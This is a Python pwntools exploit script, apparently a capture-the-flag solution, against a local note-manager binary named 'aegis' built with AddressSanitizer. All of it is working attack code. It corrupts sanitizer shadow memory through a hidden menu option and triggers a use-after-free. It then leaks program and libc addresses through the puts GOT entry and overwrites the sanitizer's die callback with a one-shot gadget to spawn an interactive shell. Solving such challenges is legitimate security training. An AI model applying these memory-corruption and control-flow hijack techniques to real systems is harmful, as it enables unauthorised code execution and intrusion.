from pwn import *

s = process('./aegis')

def addNote(Size, Content, ID):
    s.sendline('1')
    s.recvuntil('Size: ')
    s.sendline(str(Size))
    s.recvuntil('Content: ')
    s.send(Content)
    s.recvuntil('ID:')
    s.sendline(str(int(ID)))
    s.recvuntil('Choice: ')

def showNote(Index):
    s.sendline('2')
    s.recvuntil('Index: ')
    s.sendline(Index)
    s.recvuntil('Content: ')
    Content = s.recvline()
    s.recvuntil('ID: ')
    ID = s.recvline()
    print 'Content: ' + Content + 'ID: ' + ID
    s.recvuntil('Choice: ')

def updateNote(Index, Content, ID, shell=0):
    s.sendline('3')
    s.recvuntil('Index: ')
    s.sendline(Index)
    s.recvuntil('New Content: ')
    s.send(Content)
    s.recvuntil('New ID: ')
    s.sendline(str(int(ID)))
    if shell == 0:
        s.recvuntil('Choice: ')

def deleteNote(Index):
    s.sendline('4')
    s.recvuntil('Index: ')
    s.sendline(Index)
    s.recvuntil('Choice: ')

def exit():
    s.sendline('5')
    s.recv()

def secret(addr):
    s.sendline('666')
    s.recvuntil('Lucky Number: ')
    s.sendline(str(int(addr)))
    s.recvuntil('Choice: ')

def leak(Index):
    s.sendline('2')
    s.recvuntil('Index: ')
    s.sendline(Index)
    s.recvuntil('Content: ')
    leak = u64(s.recv(6)+'\x00'*2)
    s.recvuntil('Choice: ')
    return leak

s.recvuntil('Choice: ')
addNote(0x10, 'A'*8, 0x4142434445464748)
secret((0x602000000000>>3)+0x7fff8000+4)
updateNote('0', 'A'*0x12, 0x414243440)
updateNote('0', 'A'*0x10+'\x02\x00\x00\x00\xff\xff'+'A', 0x01ffffffff02ff)
deleteNote('0')
addNote(0x10, p64(0x602000000018), 0x0)
leaked = leak('0')
leak_base = leaked - 0x114ab0
die_callback = leak_base + 0xfb0888
got_puts = leak_base + 0x347e28

updateNote('1', 'A'*2, 0x414141414141)
updateNote('1', p64(got_puts), 0x0)
leak_libc = leak('0')-0x809c0
oneshot = leak_libc + 0x10a38c
updateNote('1', p64(die_callback), 0x0)
updateNote('0', '\x00', oneshot, 1)
s.interactive()

